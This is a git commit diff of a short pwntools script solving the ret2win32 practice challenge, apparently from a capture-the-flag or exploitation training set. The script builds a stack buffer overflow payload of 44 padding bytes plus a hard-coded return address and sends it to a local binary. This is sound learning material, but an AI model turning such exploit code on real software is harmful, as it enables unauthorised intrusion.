e2eb69529b44269f119d7f3f587ae04028163f23
sarahfalco <sarah.falco.s@gmail.com>
2025-12-24 11:41:29 +0100

    commit sol ret2win32

--- ret2win/ret2win32/sol32.py
+++ ret2win/ret2win32/sol32.py
@@ -1,14 +1,12 @@
 #!/usr/bin/env python3
 from pwn import *
 
-offset = 44
+buffer_overflow = 44
+
 ret2win = 0x0804862c
 
-payload = b"A" * offset + p32(ret2win)
+payload = (b"A" * buffer_overflow + p32(ret2win))
 
 p = process("./ret2win32")
 p.sendline(payload)
 print(p.recvall(timeout=2).decode(errors='ignore'))
-# oppure se vuoi interagire:
-# p.interactive()
-
